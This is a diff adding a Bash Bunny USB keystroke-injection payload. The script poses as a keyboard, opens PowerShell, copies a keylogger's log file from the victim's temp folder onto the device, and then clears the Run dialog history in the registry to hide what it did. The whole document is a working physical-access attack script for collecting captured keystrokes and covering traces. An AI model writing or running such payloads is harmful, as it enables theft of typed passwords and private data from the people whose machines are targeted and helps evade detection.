@@ -1,0 +1,32 @@
+#!/bin/bash
+#red LED indicating the start of the script
+LED R
+
+#defining the bashbunny as storage and HID
+ATTACKMODE STORAGE HID 0xF000/0xFF02
+
+#opening run dialog box
+Q GUI R
+
+Q DELAY 500
+
+#running powershell
+Q STRING powershell
+Q ENTER
+
+Q DELAY 1000
+
+#entering the keylogger folder
+Q STRING cd temp
+Q ENTER
+
+#Copying the log file to bashbunny
+Q STRING Copy-Item .\log.txt -Destination H:\payloads\switch2\
+Q ENTER
+
+#clearing the logs from run dialog box
+Q STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+Q ENTER
+
+#green LED indicating the end of the script
+LED G
